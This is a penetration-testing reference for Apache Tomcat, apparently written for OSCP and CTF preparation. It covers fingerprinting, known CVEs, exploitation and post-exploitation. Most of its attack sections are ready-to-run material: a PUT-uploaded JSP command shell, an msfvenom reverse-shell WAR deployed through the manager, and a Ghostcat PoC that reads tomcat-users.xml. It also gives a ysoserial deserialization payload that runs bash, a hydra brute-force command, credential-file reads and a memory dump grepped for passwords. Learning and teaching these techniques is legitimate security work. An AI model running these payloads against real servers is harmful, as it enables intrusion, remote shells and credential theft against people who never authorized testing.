# Apache Tomcat

> Java servlet container reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

```bash
curl -sI http://<TARGET>:8080/ | grep -iE '^(server|x-powered-by)'
```

Expected output:

```text
Server: Apache-Coyote/1.1
```

Note: Tomcat hides the exact version in `Server` unless `server.info` is customized.
Version is often visible on error pages.

### Default welcome page

Tomcat default root page:

```html
<title>Apache Tomcat/9.0.65</title>
...
<img src="tomcat.svg" alt="[Tomcat Logo]" />
```

The version `Apache Tomcat/x.y.z` in `<title>` and the footer is a reliable
fingerprint.

### Default error pages

Tomcat default 404:

```html
<h1>HTTP Status 404 - /notfound</h1>
<hr class="line" />
<p><b>Type</b> Status Report</p>
<p><b>Message</b> /notfound</p>
<p><b>Description</b> The requested resource [/notfound] is not available</p>
<hr class="line" />
<h3>Apache Tomcat/9.0.65</h3>
```

### Common ports

- `8080` - default HTTP connector
- `8443` - default HTTPS connector
- `8009` - AJP13 (Apache JServ Protocol) - see Ghostcat CVE-2020-1938
- `8005` - shutdown port (localhost only)

### nmap / whatweb

```bash
nmap -sV -p 8080,8443,8009 --script http-title,http-headers,ajp-headers <TARGET>
whatweb -a 3 http://<TARGET>:8080/
```

---

## 2. Enumeration

### Manager / Host-Manager

Two management apps:

- `/manager/html` - deploy/undeploy WARs
- `/host-manager/html` - manage virtual hosts

Both require auth. Try default creds (see section 5).

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>:8080/manager/html
# 401 -> enabled, auth required
# 403 -> disabled from remote (allow="127\.\d+\.\d+\.\d+|::1")
# 404 -> not deployed
```

### Version fingerprinting

```bash
curl -s http://<TARGET>:8080/ | grep -oE 'Apache Tomcat/[0-9.]+'
curl -s http://<TARGET>:8080/docs/ | grep -oE 'Apache Tomcat/[0-9.]+'
curl -s http://<TARGET>:8080/examples/ | grep -oE 'Apache Tomcat/[0-9.]+'
```

### Common paths

```bash
for p in manager/html host-manager/html docs examples ROOT \
         manager/status manager/j_security_check; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:8080/$p")
  echo "$code  /$p"
done
```

### Application enumeration

```bash
ffuf -u http://<TARGET>:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,302,401,403
```

### AJP port (8009)

If 8009 is open, Ghostcat is a candidate (CVE-2020-1938).

```bash
nmap -p 8009 -sV --script ajp-* <TARGET>
```

### Manager credentials

Look for `tomcat-users.xml` exposure (rare) or use defaults (see section 5).

---

## 3. Known CVEs

### CVE-2020-1938 - Ghostcat (AJP file read / RCE)

AJP connector allows file read of any file under webapps (WEB-INF/web.xml,
config, JSP source) and, if file upload is available, RCE via JSP inclusion.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-1938
Affected: Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31.

PoC:
```bash
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
python CNVD-2020-10487-Tomcat-Ajp-lfi/CNVD-2020-10487-Tomcat-Ajp-lfi.py <TARGET> -p 8009 -f /WEB-INF/web.xml
```

Metasploit: `auxiliary/admin/http/tomcat_ghostcat`

### CVE-2017-12615 - PUT method JSP upload (RCE)

If `readonly=false` in `web.xml` (default is `true`), PUT method allows upload
of JSP. Upload `shell.jsp/` (trailing slash bypass on Windows).

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-12615
Affected: Tomcat 7.0.0 - 7.0.79 (Windows with `readonly=false`).

PoC:
```bash
curl -X PUT -d '<%@ page import="java.util.*,java.io.*"%><%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next() %>' \
  http://<TARGET>:8080/shell.jsp/
curl "http://<TARGET>:8080/shell.jsp?cmd=id"
```

### CVE-2017-12617 - PUT method JSP upload (bypass)

Bypass for CVE-2017-12615 fix. `readonly=false` still required.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-12617
Affected: Tomcat 7.x < 7.0.82, 8.x < 8.5.23, 9.x < 9.0.1.

### CVE-2020-9484 - Session deserialization RCE

If `PersistentManager` with `FileStore` is configured, an attacker with file
write can point `JSESSIONID` at a malicious serialized session -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-9484
Affected: Tomcat 7.x < 7.0.104, 8.x < 8.5.55, 9.x < 9.0.35.

Requires: `PersistentManager` enabled + file upload + `ysoserial`.

### CVE-2021-25329 - Incomplete fix for CVE-2020-9484

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-25329
Affected: Tomcat 7.x < 7.0.108, 8.x < 8.5.61, 9.x < 9.0.41.

### CVE-2024-50379 / CVE-2024-56337 - RCE via case-insensitive filesystem

Race condition in write-enabled default servlet on case-insensitive filesystems.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-50379
NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-56337
Affected: Tomcat 11.x < 11.0.2, 10.x < 10.1.34, 9.x < 9.0.98.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 6.x-9.0.30 | Ghostcat LFI/RCE | CVE-2020-1938 |
| 7.0.0-7.0.79 | PUT JSP upload | CVE-2017-12615 |
| 7.0.0-9.0.0 | PUT bypass | CVE-2017-12617 |
| 7.0.0-9.0.34 | Session deser | CVE-2020-9484 |
| 9.x < 9.0.98 | Case-insens RCE | CVE-2024-50379 |

---

## 4. Exploitation Patterns

### Manager WAR deploy -> RCE

If you have manager credentials:

```bash
# 1. Generate a malicious WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war -o shell.war

# 2. Deploy via manager
curl -u 'tomcat:tomcat' --upload-file shell.war \
  "http://<TARGET>:8080/manager/text/deploy?path=/shell&update=true"

# 3. Trigger
curl "http://<TARGET>:8080/shell/"
```

Alternative: deploy via `/manager/html` UI in browser.

### PUT method JSP upload (CVE-2017-12615)

Requires `readonly=false` (non-default):

```bash
curl -X PUT -d '<%= "id" %>' http://<TARGET>:8080/shell.jsp/
curl http://<TARGET>:8080/shell.jsp
```

Windows bypass (trailing space): `shell.jsp%20` or `shell.jsp/`.

### Ghostcat file read (CVE-2020-1938)

Read sensitive files via AJP:

```bash
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <TARGET> -p 8009 -f /WEB-INF/web.xml
```

Extract credentials from `tomcat-users.xml` if included:

```bash
python CNVD-2020-10487-Tomcat-Ajp-lfi.py <TARGET> -p 8009 -f /conf/tomcat-users.xml
```

### Session deserialization (CVE-2020-9484)

Chain requires:
1. `PersistentManager` + `FileStore` in `context.xml`
2. Ability to write a file (e.g. via upload)
3. `ysoserial` to generate payload

```bash
# Upload malicious serialized object to /tmp/sess_backdoor
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,<b64>}|{base64,-d}|bash" > /tmp/sess_backdoor

# Trigger: request with matching JSESSIONID
curl -H "Cookie: JSESSIONID=../../../../tmp/sess_backdoor" http://<TARGET>:8080/
```

### Text-based manager deploy (with creds)

```bash
# List apps
curl -u user:pass http://<TARGET>:8080/manager/text/list

# Deploy
curl -u user:pass --upload-file shell.war "http://<TARGET>:8080/manager/text/deploy?path=/shell"

# Undeploy (cleanup)
curl -u user:pass "http://<TARGET>:8080/manager/text/undeploy?path=/shell"
```

---

## 5. Misconfigurations

### Default credentials

Tomcat manager `tomcat-users.xml` default (from older installs and CTFs):

| user | password | roles |
|------|----------|-------|
| tomcat | tomcat | manager-gui, admin-gui |
| admin | admin | manager-gui, admin-gui |
| both | both | manager-gui, admin-gui |
| role1 | role1 | - |
| manager | manager | manager-gui |

Try all combinations. Use `hydra` for brute force:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET> \
  -s 8080 http-get /manager/html -t 1 -W 3
```

### Manager exposed from remote

Default `context.xml` for manager:

```xml
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />
```

If `allow` is missing or too broad, manager is reachable from internet.

### AJP connector exposed

`8009` reachable -> Ghostcat candidate.

```bash
nmap -p 8009 <TARGET>
```

### PUT method enabled

Check with OPTIONS:

```bash
curl -s -X OPTIONS -i http://<TARGET>:8080/ | grep -i allow
# If PUT/DELETE present -> CVE-2017-12615 candidate
```

### WAR upload without auth

If manager auth is bypassed (rare) or `deployOnStartup` scans a writable dir:

```bash
# Direct WAR file drop to webapps (requires file write)
ls -la /opt/tomcat/webapps/
```

### Backup files

```bash
for f in tomcat-users.xml.bak .tomcat-users.xml.swp web.xml.bak context.xml.old; do
  curl -s -o /dev/null -w "%{http_code}  $f\n" "http://<TARGET>:8080/$f"
done
```

---

## 6. Post-Exploitation

### Config file locations

| OS | Path |
|----|------|
| Debian/Ubuntu | `/etc/tomcat9/`, `/var/lib/tomcat9/conf/` |
| RHEL/CentOS | `/etc/tomcat/`, `/usr/share/tomcat/conf/` |
| Manual install | `$CATALINA_HOME/conf/` (usually `/opt/tomcat/conf/`) |
| Docker | `/usr/local/tomcat/conf/` |

### What to look for

```bash
cat /opt/tomcat/conf/tomcat-users.xml 2>/dev/null
cat /etc/tomcat9/tomcat-users.xml 2>/dev/null
cat /opt/tomcat/conf/server.xml 2>/dev/null
cat /opt/tomcat/conf/context.xml 2>/dev/null
cat /opt/tomcat/conf/web.xml 2>/dev/null
```

Key items:

- `tomcat-users.xml` -> credentials + roles
- `server.xml` -> connectors, `keystorePass`, `truststorePass`
- `context.xml` -> `PersistentManager`, resource definitions, `DataSource` passwords
- `web.xml` -> `readonly` flag, security constraints

### Application source / class files

Deployed webapps are often unzipped:

```bash
find /opt/tomcat/webapps/ -name '*.class' -o -name '*.jsp' -o -name 'WEB-INF' -type d 2>/dev/null
```

Decompile `.class` with `jadx` or `cfr`:

```bash
find /opt/tomcat/webapps/ -name '*.class' -exec jadx {} \;
```

Look for hardcoded credentials, DB connection strings, API keys.

### Log files

```bash
ls -la /opt/tomcat/logs/ /var/log/tomcat9/ 2>/dev/null
tail -n 200 /opt/tomcat/logs/catalina.out
```

Logs contain: deployed WAR names, session IDs, credentials from basic auth.

### Process user

```bash
ps aux | grep -i tomcat
id tomcat
# Usually runs as 'tomcat' user; if root, privesc is trivial
```

### Credentials in memory

Tomcat process holds DB passwords, session keys in memory. Dump via:

```bash
# If you have root / ptrace
gcore %(pgrep -f tomcat | head -1)
strings core.* | grep -iE 'password|secret|key'
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the Tomcat version from the default page `<title>` or `/docs/` page.

> [!IMPORTANT]
> OSCP report: for manager WAR deploy, screenshot the HTTP 200 response from the deploy endpoint AND the reverse shell connection.

> [!IMPORTANT]
> OSCP report: for Ghostcat, screenshot the AJP request AND the leaked `web.xml` or `tomcat-users.xml` content.

---

## 8. References

- Tomcat official docs: https://tomcat.apache.org/
- NVD search: https://nvd.nist.gov/vuln/search/results?query=tomcat
- Ghostcat writeup: https://www.chaitin.cn/en/ghostcat
- CVE-2017-12615 PoC: https://github.com/cyberheartmi9/CVE-2017-12617
- CVE-2020-9484 writeup: https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
- HackTricks - Tomcat: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
- ysoserial: https://github.com/frohoff/ysoserial

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*